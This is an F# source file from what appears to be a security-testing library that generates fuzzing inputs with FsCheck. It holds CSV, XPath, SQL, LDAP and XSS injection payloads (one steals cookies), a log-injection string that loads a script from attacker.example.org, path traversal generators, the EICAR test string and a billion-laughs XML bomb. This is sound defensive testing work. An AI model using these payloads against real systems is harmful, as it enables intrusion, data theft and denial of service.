namespace FSecurity

open System
open System.IO
open System.Collections.Generic
open FsCheck

/// Module that holds the security testing functionality.
module FSec = 
  /// Gets a generated list of strings which only contain charaters from the alphabet.
  [<CompiledName("Alphabet")>]
  let alphabet = Gen.elements Fuzz.alphabet

  /// Gets a generated list of alphanumerical values.
  [<CompiledName("Alphanum")>]
  let alphanum = Gen.elements Fuzz.alphanum

  /// Gets a generated list of alphanumerical values and special charaters.
  [<CompiledName("AlphanumSpecial")>]
  let alphanum_special = Gen.elements Fuzz.alphanum_special

  /// Gets a generated set of content-type values.
  [<CompiledName("ContentType")>]
  let contentType = Gen.elements Fuzz.contentType

  /// Gets a generated set of fuzzed versions of a given set of input strings.
  let case inputs =
    Seq.collect Fuzz.case inputs
    |> Gen.elements

  /// Gets a generated set of fuzzed versions of a given set of input strings.
  let Case ([<ParamArray>] inputs) = case inputs

  /// Injection string for CSV files
  [<CompiledName("CsvInject")>]
  let csvInject = Gen.constant "=cmd|' /C calc'!A0"

  /// <summary>
  /// XPath input generator that provides malformed XPath inputs that can be used to discover XPath vulnerabilities.
  /// XPath is a "simple" language to locate information in an XML document. 
  /// Similar to SQL Injection, XPath Injection attacks occur when an application uses user-supplied information 
  /// to construct an XPath query for XML data. By sending intentionally malformed information into the application, 
  /// an attacker can find out how the XML data is structured, or access data that he may not normally have access to.
  /// (more info: https://www.owasp.org/index.php/XPATH_Injection)
  /// </summary>
  /// <remarks>
  ///   Severity: Critical
  ///   Vulnerability Indicators: incorrect/invalid syntax, syntax error, runtime errors, XPathException, System.Xml.XPath 
  /// </remarks>
  [<CompiledName("XPathInject")>]
  let xpathInject =
    Gen.elements 
      [ "1' or 1=1"
        "a%' or '1' = '1"
        "' or '1' = '1"
        "'a or 1=1 or 'a'='a" ]

  /// <summary>
  /// XSS (Cross Site Scripting) input generator that provides malformed inputs that can be used to discover XSS vulnerabilities.
  /// Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign 
  /// and trusted web sites. (more info: https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
  /// </summary>
  /// <remarks>
  ///   Severity: Critical
  ///   Vulnerability Indicators: payload exists in response
  /// </remarks>
  [<CompiledName("XssInject")>]
  let xssInject =
    Gen.elements 
      [ "<script>alert(1)</script>"
        "<img src=x onerror=alert(1)>"
        "1\"><script>alert(document.cookie)</script>" ]

  /// <summary>
  /// SQL input generator that provides malformed inputs that can be used to discover SQL vulnerabilities.
  /// A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. 
  /// A successful SQL injection exploit can read sensitive data from the database, modify database data, 
  /// execute administration operations on the database etc. (more info: https://www.owasp.org/index.php/SQL_Injection)
  /// </summary>
  /// <remarks>
  ///   Severity: Critical
  ///   Vulnerability Indicators: incorrect/invalid syntax, syntax error, runtime errors, invalid SQL statement, conversion failed, SQLite exception, cannot open database, System.Data.SqlException, ...
  /// </remarks>
  [<CompiledName("SqlInject")>]
  let sqlInject = Fuzz.sql |> Gen.elements

  /// <summary>
  /// LDAP input generator that provides LDAP injection strings. 
  /// When receiving an "unusable" response from the SUT, it may be vulnerable for LDAP injection.
  /// An "unusable" response could be a random user record, list of users, ...
  /// LDAP is a lightweight system to manage credentials and authenticating users. 
  /// When a application is vulnerable to LDAP injection, a malicious user may can query
  /// sensitive data from other or even modify/delete it entirely.
  /// </summary>
  /// <remarks>
  ///   Severity: Critical
  ///   Vulnerability Indicators: unusable responses
  /// </remarks>
  [<CompiledName("LdapInject")>]
  let ldapInject =
    Gen.elements
      [ "*"; "*)(|(cn=*"; "*)(|(cn=*)"; "*)(|(cn=*))" ]

  /// <summary>
  /// LDAP input generator with a specified 'normal input' that provides LDAP injection strings.
  /// The 'normal input' should be something legitimate.
  /// When receiving an "unusable" response from the SUT, it may be vulnerable for LDAP injection.
  /// An "unusable" response could be a random user record, list of users, ...
  /// LDAP is a lightweight system to manage credentials and authenticating users. 
  /// When a application is vulnerable to LDAP injection, a malicious user may can query
  /// sensitive data from other or even modify/delete it entirely.
  /// </summary>
  /// <remarks>
  ///   Severity: Critical
  ///   Vulnerability Indicators: unusable responses
  /// </remarks>
  [<CompiledName("LdapWithNormalInject")>]
  let ldapWithNormalInject x =
    Gen.oneof 
      [ ldapInject
        Gen.elements 
          [ sprintf "%s)(|(cn=*" x
            sprintf "%s)(|(cn=*)" x 
            sprintf "%s)(|(cn=*))" x ] ]

  /// Log input generator to test log injection vulnerability. Inputs that are most-likely be logged can be vulnerable for injection.
  /// This generator will give you injection strings that will try to inject layout with xterm, XSS injection and add additional lines in a xterm environment
  /// with the text 'User admin logged in'.
  [<CompiledName("LogInject")>]
  let logInject =
    Gen.elements
      [ "%1B%5B%32%4A"
        "%0AUser admin logged in"
        """<script src="http://attacker.example.org/xss_exploit.js"/>""" ]

  /// John the Ripper dictionary generator
  /// Generates weak passwords used for a dictionary attack.
  [<CompiledName("DicAttackSeq"); Obsolete("Use 'Fuzz.johnTheRipper' instead")>]
  let dicAttackSeq = Fuzz.johnTheRipper

  /// John the Ripper dictionary generator
  /// Generates weak passwords used for a dictionary attack.
  [<CompiledName("DicAttack"); Obsolete("Use 'Fuzz.johnTheRipper' instead")>]
  let dicAttack = Gen.elements dicAttackSeq

  let private guid () = Guid.NewGuid().ToString()
  let private (</>) x y = Path.Combine (x, y)

  /// <summary>
  /// Creates a file for a given size stored at a given directory.
  /// </summary>
  /// <param name="dir">Location of where the file should be stored.</param>
  /// <param name="x">Value to define the file size (in MB or GB).</param>
  /// <param name="m">Metric to define the Unit of the file size.</param>
  [<CompiledName("FileOfSize")>]
  let fileOfSize x (m : Metric) (dir : DirectoryInfo) =
    let size = match m with MB -> 1048576L | GB -> 1073741824L
    let path = dir.FullName </> guid() + ".test"
    use fs = File.Create path
    fs.Seek (int64 x * size, SeekOrigin.Begin) |> ignore
    fs.WriteByte 0uy
    FileInfo path

  /// Illegal file name generator to validate the file uploading mechanism.
  /// Generate file names with semicolons, reserved names, percent sign, ampersand, ...
  [<CompiledName("FileIllegalNames")>]
  let fileIllegalNames =
    Gen.elements 
      [ "a:b.txt"     // Colon not allowed on most OSes
        "a;b.txt"     // Semicolon deprecated on most OSes
        "123456789012345678901234567890123456789012345678900123456.txt" // > 64 characters doesn't work on older file systems
        "File."       // Windows may discard final period
        "CON"         // Reserved name in Windows
        "a/b.txt"     // does this create a file named b.txt?
        "a\\b.txt"    // again, what does this do?
        "a&b.txt"     // ampersand can be interpreted by OS
        "a\%b.txt"    // percent is variable marker in Windows
        String.replicate 255 "A" + ".txt" ]

  /// Directory path generator for a Path Traversal attack.
  /// By using a dot '.' slash '/' '\' commbination (both encoded and un-endcoded),
  /// the input attacker will try to access files/directories outside the expected folder.
  [<CompiledName("PathDirTraversal")>]
  let pathDirTraversal =
    let genPathSymb unencoded encoded l =
      Gen.frequency
          [ 4, Gen.constant unencoded
            1, Gen.constant encoded ]
      |> Gen.listOfLength l

    let dots = genPathSymb ".." "%252e%252e"
    let forwardSlash = genPathSymb "/" "%2f"
    let backwardSlash = genPathSymb "\\" "%5c"

    let dotsSepBy sep =
      Gen.choose (1, 10)
      >>= fun l -> Gen.zip (dots l) (sep l)
      |> Gen.map (fun (xs, ys) ->
          List.zip xs ys
          |> List.fold (fun acc (x, y) -> 
              acc + sprintf "%s%s" x y) String.Empty)

    Gen.oneof 
      [ dotsSepBy forwardSlash
        dotsSepBy backwardSlash ]
      
  /// <summary>
  /// Fixed file(s) path generator for a Path Traversal attack.
  /// By using a dot '.' slash '/' '\' commbination (both encoded and un-endcoded),
  /// the input attacker will try to access files/directories outside the expected folder.
  /// </summary>
  /// <param name="files">List of file names that gets appended after the path traversal generation.</param>
  [<CompiledName("PathFixedFileTraversal")>]
  let pathFixedFileTraversal files =
    Gen.elements files
    |> Gen.zip pathDirTraversal
    |> Gen.map (fun (dir, file) -> dir + file)

  /// <summary>
  /// Random file(s) path generator for a Path Traversal attack.
  /// By using a dot '.' slash '/' '\' commbination (both encoded and un-endcoded),
  /// the input attacker will try to access files/directories outside the expected folder.
  /// </summary>
  /// <param name="ext">File extension to use to append to the generated path traversal.</param>
  [<CompiledName("PathFileTraversal")>]
  let pathFileTraversal ext =
    gen { return Guid.NewGuid().ToString() + ext }
    |> Gen.zip pathDirTraversal
    |> Gen.map (fun (dir, file) -> dir + file)

  /// Eicar virus represented as a string containing the virus content.
  /// For more info about the Eicar virus: http://www.eicar.org/86-0-Intended-use.html
  [<CompiledName("Eicar")>]
  let eicar = "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

  /// Eicar virus represented as a stream containing the virus content.
  /// For more info about the Eicar virus: http://www.eicar.org/86-0-Intended-use.html
  [<CompiledName("EicarVirus"); Obsolete("Use 'eicar' instead")>]
  let eicarVirus = (fun () ->
      new MemoryStream (System.Text.Encoding.UTF8.GetBytes eicar) :> Stream) ()

  /// Fuzz an entire XML document with malicious input.
  [<CompiledName("XmlFuzz")>]
  let xmlDoc = Fuzz.xmlDoc |> Gen.elements

  /// Fuzz XML elements and attributes with malicious input.
  [<CompiledName("XmlElementAndAttribute")>]
  let xmlElemAttr = Fuzz.xmlElemAttr |> Gen.elements

  /// Fuzz external entity processing (XXE) inputs for XML injection.
  [<CompiledName("XmlXxe")>]
  let xmlXxe = Fuzz.xmlXxe |> Gen.elements

  /// <summary>
  /// XML Bomb input generator: An XML bomb is a message composed and sent with the intent of overloading an XML parser (typically HTTP server). 
  /// It is block of XML that is both well-formed and valid according to the rules of an XML schema. 
  /// It is a type of XML Denial of Service (DoS) attack. (more info: https://en.wikipedia.org/wiki/Billion_laughs)
  /// </summary>
  /// <remarks>
  ///   Severity: Critical
  ///   Vulnerability Indicators: timeout
  /// </remarks>
  [<CompiledName("XmlBomb")>]
  let xmlBomb =
    let xml =  
      """<?xml version="1.0"?>
         <!DOCTYPE root [
         <!ELEMENT root (#PCDATA)>
         <!ENTITY  ha0 "Ha !">"""
    let xs l = 
      [1..l]
      |> List.map (fun i ->
          sprintf "<!ENTITY ha%i \"&ha%i;&ha%i;\" >" i (i-1) (i-1))
      |> List.reduce (+)

    Gen.choose (30, 100)
    |> Gen.map (fun l ->
        sprintf "%s%s]><root>&ha%i;</root>" xml (xs l) l)

  /// <summary>
  /// Malicious XML generator: generates a XML structure with a specified depth and tag length to detect failures in naive XML parsing implementations.
  /// </summary>
  /// <param name="depth">Defines the depth of the XML document.</param>
  /// <param name="tagLen">Defines the length of the tag names.</param>
  [<CompiledName("XmlMaliciousDepthTagLen")>]
  let xmlMaliciousDepthTagLen depth tagLen =
    let randomAttrOfLength l =
      [1..l]
      |> Seq.fold (fun acc x -> sprintf "%s a%i=\"%i\"" acc x x) ""
      |> Gen.constant
      |> Gen.listOfLength depth

    let randomTag = 
      Gen.elements [ 'a'..'z' ]
      |> Gen.listOfLength tagLen
      |> Gen.map (Seq.map string >> Seq.reduce (+))
    
    randomTag
    |> Gen.listOfLength depth
    |> Gen.zip (Gen.choose (100, 1000) >>= randomAttrOfLength)
    |> Gen.map (fun (attrs, xs) ->
        [ yield "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
          yield! attrs |> Seq.map2 (sprintf "<%s %s>") xs
          yield! xs |> Seq.rev |> Seq.map (sprintf "</%s>") ]
        |> Seq.reduce (+))

  /// Malicious XML generator: generates a XML structure with a depth of 1-100, a tag length of 100-1000 and a attribute count of 100-100.
  /// With this generator you can detect failures in naive XML parsers.
  [<CompiledName("XmlMalicious")>]
  let xmlMalicious = 
    Gen.choose (100, 1000) 
    |> Gen.zip (Gen.choose (1, 100))
    >>= fun (tagLen, depth) -> xmlMaliciousDepthTagLen tagLen depth
  
  open System.Xml

  /// <summary>
  /// Alters the specified `XmlDocument` with a XPath identified value generator map for each matched XPath expression.
  /// </summary>
  /// <param name="doc">XML document to inject the generated values.</param>
  /// <param name="gvalues">XPath/Generator map to identify each node to inject with a generated value.</param>
  [<CompiledName("XmlMaliciousInject")>]
  let xmlMaliciousInject (doc : XmlDocument) gvalues =
    Map.fold (fun (gmal : Gen<_>) k gvalue ->
      let nodes = 
        doc.SelectNodes k
        |> fun xs -> 
            if xs = null then Seq.empty 
            else Seq.cast<XmlNode> xs

      let setGenValuesInDoc mal =
        gvalue
        |> Gen.listOfLength (Seq.length nodes)
        |> Gen.map (fun vs ->
            Seq.zip nodes vs
            |> Seq.iter (fun (n, v) -> 
                n.InnerXml <- v.ToString ()) 
            mal)

      gmal >>= setGenValuesInDoc) (Gen.constant doc) gvalues

  /// Generates a fuzzed JSON value with malicious inputs.
  [<CompiledName("Json")>]
  let json = Fuzz.json |> Gen.elements

  /// Generates a string that contains all sorts of big naughty strings. (See `Fuzz.naughty`).
  [<CompiledName("Naughty")>]
  let naugthy = Fuzz.naughty |> Gen.elements

  /// <summary>
  /// Generates an url with hidden specified query parameters: `admin=true`, `debug=true`.
  /// </summary>
  /// <param name="baseUrl">The base URL to add the generated query parameters.</param>
  [<CompiledName("UrlHiddenAdmin")>]
  let urlHiddenAdmin baseUrl =
    Gen.elements [ "admin=true"; "debug=true" ]
    |> Gen.map (sprintf """%s?%s""" baseUrl)

  /// <summary>
  /// Generates an url with a specified number of query parameters each with its own generator.
  /// </summary>
  /// <param name="baseUrl">The base URL to add the generated query parameters.</param>
  /// <param name="args">Map containing a query parameter names and their generator for its value.</param>
  [<CompiledName("UrlTampered")>]
  let urlTampered baseUrl args =
    args
    |> Map.map (fun k v -> 
        Gen.map (sprintf """%s=%A""" k) v)
    |> Map.fold (fun acc _ v -> v :: acc) []
    |> List.rev
    |> Gen.sequenceToSeq
    |> Gen.map (
        Seq.reduce (sprintf """%s&%s""")
        >> sprintf """%s?%s""" baseUrl)

  /// <summary>
  /// Generates an url with injected JavaScript for the given query parameters.
  /// </summary>
  /// <param name="baseUrl">The base URL to add the injection.</param>
  /// <param name="args">List containing all the query parameter names.</param>
  [<CompiledName("UrlInject")>]
  let urlInject baseUrl args =
    args
    |> List.map (fun a -> a, xssInject)
    |> Map.ofList
    |> urlTampered baseUrl

  /// <summary>
  /// Generates an url with an additional "bogus" query parameters added to the specified base url.
  /// </summary>
  /// <param name="baseUrl">The base URL to add the generated query parsameters.</param>
  /// <param name="args">Map containing a query parameter names and their generator for its value.</param>
  [<CompiledName("UrlBogus")>]
  let urlBogus baseUrl args =
    let appendMap = Map.fold (fun acc k v ->
      match Map.tryFind k acc with
      | Some _ -> acc
      | None -> Map.add k v acc)

    let bogus =
      List.zip [ 'a'..'z' ] [ 1..26 ]
      |> List.map (fun (x, y) -> sprintf "%c%07i" x y)
      |> fun xs ->
          Gen.choose (1, 25)
          |> Gen.map (fun i -> List.take i xs)
      |> Gen.map (fun xs ->
          xs |> List.map (fun x -> x, Arb.generate<'a>)
             |> Map.ofList
             |> appendMap args)
    bogus >>= urlTampered baseUrl

  /// <summary>
  /// Generates an url with an additional "bogus" query parameters added to the specified base url.
  /// </summary>
  /// <param name="baseUrl">The base URL to add the generated query parsameters.</param>
  /// <param name="args">Map containing a query parameter names and their generator for its value.</param>
  [<CompiledName("UrlBogus")>]
  let urlBogusDict baseUrl (args : IDictionary<string, Gen<_>>) =
    (args :> seq<_>)
    |> Seq.map (|KeyValue|)
    |> Map.ofSeq
    |> urlBogus baseUrl

  /// Generates a HTTP method.
  [<CompiledName("HttpMethod")>]
  let httpMethod = Gen.elements Fuzz.httpMethods

  /// Gets a wide sample of malicious input for windows targets
  [<CompiledName("Windows")>]
  let windows = Fuzz.windows |> Gen.elements

  /// Gets a wide sample of malicious input for unix-like targets
  [<CompiledName("Unix")>]
  let unix = Fuzz.unix |> Gen.elements